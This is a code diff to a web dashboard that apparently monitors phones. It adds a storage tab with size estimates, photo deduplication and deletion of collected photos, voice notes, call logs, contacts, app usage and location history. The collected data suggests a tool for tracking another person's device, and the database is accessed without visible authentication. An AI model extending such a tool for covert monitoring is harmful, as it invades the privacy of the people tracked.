@@ -185,6 +185,7 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <button class="tab-btn" data-tab="voice">&#x1F3A4; Voice</button>
 <button class="tab-btn" data-tab="playback">&#x25B6; Playback</button>
 <button class="tab-btn" data-tab="insights">&#x1F4CA; Insights</button>
+<button class="tab-btn" data-tab="storage">&#x1F4E6; Storage</button>
 </div>
 <div class="content" id="tabContent">
 <div class="active" id="tab-live">
@@ -255,6 +256,17 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <div id="inHeatmap" style="display:flex;gap:2px;margin-top:6px;flex-wrap:wrap"></div>
 </div>
 <button class="chip" style="background:var(--accent);color:#000;margin-top:8px" onclick="exportData()">&#x1F4E5; Export Data (CSV)</button>
+</div>
+<div id="tab-storage">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+  <span style="font-size:14px;font-weight:500">&#x1F4E6; Storage & Cleanup</span>
+  <span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="refreshStorage()">&#x1F504; Refresh</span>
+</div>
+<div id="storageOverview" style="margin-bottom:14px"></div>
+<div style="border-top:1px solid var(--border);padding-top:10px">
+  <div style="font-size:13px;font-weight:500;margin-bottom:8px">&#x1F9F9; Cleanup Actions</div>
+  <div id="cleanupActions" style="display:flex;flex-direction:column;gap:6px"></div>
+</div>
 </div>
 <div id="tab-playback">
 <div class="pb-stats" id="pbStats" style="display:none">
@@ -600,6 +612,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
     if (btn.dataset.tab === 'playback') renderPlaybackTab();
     if (btn.dataset.tab === 'insights') renderInsights();
+    if (btn.dataset.tab === 'storage') refreshStorage();
   });
 });
 
@@ -772,14 +785,26 @@ async function pollMeta() {
 
 function renderPhotosFromCache() {
   const grid = document.getElementById('photoGrid');
-  const tsKeys = Object.keys(cachedPhotos).sort((a, b) => (parseInt(b)||0) - (parseInt(a)||0));
+  const groups = {};
+  for (const [ts, doc] of Object.entries(cachedPhotos)) {
+    if (!doc || !doc.data) continue;
+    const key = (doc.fileName || '') + '|' + (doc.dateTaken || '');
+    const existing = groups[key];
+    if (!existing || (doc.data.length > (existing.data ? existing.data.length : 0))) {
+      groups[key] = doc;
+    }
+  }
+  const tsKeys = Object.keys(groups).sort((a, b) => {
+    const va = groups[a], vb = groups[b];
+    return ((vb.dateTaken || 0) - (va.dateTaken || 0)) || ((vb.timestamp || 0) - (va.timestamp || 0));
+  });
   if (!tsKeys.length) { grid.innerHTML = '<div class="label">No photos yet</div>'; return; }
-  grid.innerHTML = tsKeys.map(ts => {
-    const doc = cachedPhotos[ts];
+  grid.innerHTML = tsKeys.map(key => {
+    const doc = groups[key];
     if (!doc) return '';
-    const docTs = parseInt(ts);
+    const ts = doc.timestamp || 0;
     const dateTaken = doc.dateTaken ? 'Captured: ' + pkt(doc.dateTaken) : '';
-    const synced = 'Synced: ' + pkt(docTs);
+    const synced = 'Synced: ' + pkt(ts);
     const name = doc.fileName ? doc.fileName : '';
     const line1 = name || dateTaken || synced;
     const line2 = dateTaken ? dateTaken + ' | ' + synced : synced;
@@ -1581,6 +1606,197 @@ async function renderInsights() {
   }
 }
 
+// --- Storage & Cleanup ---
+function formatBytes(bytes) {
+  if (!bytes || bytes < 0) return '0 B';
+  const units = ['B', 'KB', 'MB', 'GB'];
+  let i = 0;
+  let val = bytes;
+  while (val >= 1024 && i < units.length - 1) { val /= 1024; i++; }
+  return val.toFixed(i > 0 ? 1 : 0) + ' ' + units[i];
+}
+
+async function deleteRTDB(path) {
+  try {
+    const r = await fetch(`${RTDB}/${path}.json`, { method: 'DELETE' });
+    return r.ok;
+  } catch { return false; }
+}
+
+async function estimateNodeSize(path, sampleSize = 3) {
+  const keys = await fetchRTDB(path, 'shallow=true');
+  if (!keys || typeof keys !== 'object') return { count: 0, bytes: 0 };
+  const entries = Object.keys(keys);
+  const count = entries.length;
+  if (count === 0) return { count: 0, bytes: 0 };
+  let totalBytes = 0;
+  let sampled = 0;
+  const toSample = entries.sort(() => Math.random() - 0.5).slice(0, sampleSize);
+  for (const key of toSample) {
+    try {
+      const r = await fetch(`${RTDB}/${path}/${key}.json`);
+      if (r.ok) {
+        const text = await r.text();
+        totalBytes += new Blob([text]).size;
+        sampled++;
+      }
+    } catch {}
+  }
+  const avgBytes = sampled > 0 ? totalBytes / sampled : 0;
+  return { count, bytes: Math.round(count * avgBytes) };
+}
+
+async function refreshStorage() {
+  if (!selectedDevice) return;
+  const el = document.getElementById('storageOverview');
+  el.innerHTML = '<div class="label">Scanning storage...</div>';
+  const devicePath = `devices/${selectedDevice}`;
+  try {
+    const [photos, voice, timeline, contacts, apps, location] = await Promise.all([
+      estimateNodeSize(`${devicePath}/photos`, 3),
+      estimateNodeSize(`${devicePath}/voice_notes`, 2),
+      estimateNodeSize(`${devicePath}/timeline`, 1),
+      estimateNodeSize(`${devicePath}/contacts`, 1),
+      estimateNodeSize(`${devicePath}/apps`, 1),
+      estimateNodeSize(`${devicePath}/location`, 1)
+    ]);
+    const categories = [
+      { name: 'Photos', icon: '📸', path: 'photos', ...photos },
+      { name: 'Voice Notes', icon: '🎤', path: 'voice_notes', ...voice },
+      { name: 'Timeline', icon: '📞', path: 'timeline', ...timeline },
+      { name: 'Contacts', icon: '👥', path: 'contacts', ...contacts },
+      { name: 'App Usage', icon: '📊', path: 'apps', ...apps },
+      { name: 'Location', icon: '📍', path: 'location', ...location }
+    ];
+    let totalBytes = 0;
+    let html = '<div style="font-size:13px;font-weight:500;margin-bottom:6px">📊 Storage Overview</div>';
+    html += '<table style="font-size:12px"><thead><tr><th>Category</th><th>Entries</th><th>Est. Size</th></tr></thead><tbody>';
+    for (const cat of categories) {
+      totalBytes += cat.bytes;
+      html += `<tr><td>${cat.icon} ${cat.name}</td><td>${cat.count === 0 ? '—' : cat.count}</td><td>${cat.count === 0 ? '—' : formatBytes(cat.bytes)}</td></tr>`;
+    }
+    html += `<tr style="border-top:2px solid var(--accent);font-weight:600"><td>Total</td><td>${categories.reduce((s, c) => s + c.count, 0)}</td><td>${formatBytes(totalBytes)}</td></tr>`;
+    html += '</tbody></table>';
+    html += '<div style="font-size:10px;color:var(--muted);margin-top:4px">* Sizes estimated from random samples. Refresh to update.</div>';
+    el.innerHTML = html;
+    renderCleanupActions(categories);
+  } catch {
+    el.innerHTML = '<div class="label" style="color:var(--danger)">Failed to scan storage</div>';
+  }
+}
+
+function renderCleanupActions(categories) {
+  const el = document.getElementById('cleanupActions');
+  const actions = [
+    { label: '🧹 Dedup Photos', desc: 'Remove duplicate photos (keep highest quality)', action: 'dedupPhotos', path: 'photos', icon: '📸' },
+    { label: '🗑 Delete All Photos', desc: 'Remove all uploaded photos', action: 'deleteAll', path: 'photos', icon: '📸', dangerous: true },
+    { label: '🗑 Delete Voice Notes', desc: 'Remove all voice recordings', action: 'deleteAll', path: 'voice_notes', icon: '🎤', dangerous: true },
+    { label: '🗑 Delete Timeline', desc: 'Remove call logs & timeline events', action: 'deleteAll', path: 'timeline', icon: '📞', dangerous: true },
+    { label: '🗑 Delete Contacts', desc: 'Remove synced contacts', action: 'deleteAll', path: 'contacts', icon: '👥', dangerous: true },
+    { label: '🗑 Delete App Usage', desc: 'Remove app usage history', action: 'deleteAll', path: 'apps', icon: '📊', dangerous: true },
+    { label: '🗑 Delete Location History', desc: 'Remove location data (keeps current)', action: 'deleteLocHistory', path: 'location', icon: '📍', dangerous: true },
+    { label: '⚠️ DELETE EVERYTHING', desc: 'Wipe ALL data for this device from RTDB', action: 'deleteAllData', path: '', icon: '☠️', dangerous: true }
+  ];
+  el.innerHTML = actions.map(a => {
+    const cat = categories.find(c => c.path === a.path);
+    const count = cat ? cat.count : 0;
+    return `<div class="card" style="border-left-color:${a.dangerous ? 'var(--danger)' : 'var(--accent)'};padding:10px 14px;margin-bottom:6px">
+      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px">
+        <div>
+          <div style="font-size:13px;font-weight:500">${a.label}</div>
+          <div style="font-size:11px;color:var(--muted)">${a.desc}${count > 0 ? ` (${count} entries)` : ''}</div>
+        </div>
+        <button class="chip" style="background:${a.dangerous ? 'var(--danger)' : 'var(--accent)'};color:#000;border-color:transparent;font-size:11px" onclick="execCleanup('${a.action}','${a.path}')" ${count === 0 && a.action !== 'deleteAllData' ? 'disabled' : ''}>${a.dangerous ? '⚠ Delete' : 'Run'}</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+async function execCleanup(action, path) {
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  const base = `devices/${selectedDevice}`;
+  if (action === 'dedupPhotos') {
+    if (!confirm('Scan and remove duplicate photos? Only one copy per unique photo will be kept (the highest quality version).')) return;
+    showAlert('Scanning photo duplicates...', 'warn');
+    const keys = await fetchRTDB(`${base}/photos`, 'shallow=true');
+    if (!keys || typeof keys !== 'object') { showAlert('No photos found', 'error'); return; }
+    const allKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
+    const groups = {};
+    let scanned = 0;
+    for (const k of allKeys) {
+      const doc = await fetchRTDB(`${base}/photos/${k}`);
+      if (doc && doc.fileName) {
+        const gk = doc.fileName + '|' + (doc.dateTaken || '');
+        if (!groups[gk]) groups[gk] = [];
+        groups[gk].push({ key: k, size: (doc.data || '').length });
+      }
+      scanned++;
+      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning photo ${scanned}/${allKeys.length}...</div>`;
+    }
+    let deleted = 0, freed = 0;
+    for (const [gk, entries] of Object.entries(groups)) {
+      if (entries.length <= 1) continue;
+      entries.sort((a, b) => b.size - a.size);
+      for (let i = 1; i < entries.length; i++) {
+        const ok = await deleteRTDB(`${base}/photos/${entries[i].key}`);
+        if (ok) { deleted++; freed += entries[i].size; }
+      }
+    }
+    // Clear cache and reload
+    cachedPhotos = {};
+    await loadPhotos();
+    renderPhotosFromCache();
+    await refreshStorage();
+    showAlert(`Deleted ${deleted} duplicate photos (freed ${formatBytes(freed)})`, deleted > 0 ? 'warn' : 'error');
+    return;
+  }
+  if (action === 'deleteAll') {
+    const fullPath = `${base}/${path}`;
+    if (!confirm(`Delete ALL ${path} data?\nThis cannot be undone.`)) return;
+    const ok = await deleteRTDB(fullPath);
+    if (ok) {
+      if (path === 'photos') { cachedPhotos = {}; renderPhotosFromCache(); }
+      showAlert(`Deleted all ${path} data`, 'warn');
+      await refreshStorage();
+    } else {
+      showAlert(`Failed to delete ${path}`, 'error');
+    }
+    return;
+  }
+  if (action === 'deleteLocHistory') {
+    if (!confirm('Delete all location history (keeps current location)?\nThis cannot be undone.')) return;
+    let ok1 = true, ok2 = true;
+    const ns = await fetchRTDB(`${base}/location/night_samples`, 'shallow=true');
+    if (ns && typeof ns === 'object') {
+      for (const k of Object.keys(ns)) {
+        if (!(await deleteRTDB(`${base}/location/night_samples/${k}`))) ok1 = false;
+      }
+    }
+    const hist = await fetchRTDB(`${base}/location/history`, 'shallow=true');
+    if (hist && typeof hist === 'object') {
+      ok2 = await deleteRTDB(`${base}/location/history`);
+    }
+    await refreshStorage();
+    if (ok1 && ok2) showAlert('Deleted location history', 'warn');
+    else showAlert('Some location entries could not be deleted', 'error');
+    return;
+  }
+  if (action === 'deleteAllData') {
+    const typed = prompt('Type "DELETE" to confirm wiping ALL data for this device:');
+    if (typed !== 'DELETE') { showAlert('Cancelled', 'error'); return; }
+    const ok = await deleteRTDB(base);
+    if (ok) {
+      showAlert('All device data deleted from RTDB', 'warn');
+      cachedPhotos = {}; renderPhotosFromCache();
+      document.getElementById('storageOverview').innerHTML = '<div class="label">All data deleted</div>';
+      document.getElementById('cleanupActions').innerHTML = '<div class="label">No data to clean</div>';
+    } else {
+      showAlert('Failed to delete data', 'error');
+    }
+    return;
+  }
+}
+
 // --- Data Export ---
 async function exportData() {
   if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
@@ -1629,6 +1845,7 @@ async function init() {
   if (geofences.length === 0) {
     showAlert('Right-click on map to add geofences', 'warn');
   }
+  setTimeout(refreshStorage, 5000);
 }
 
 init();
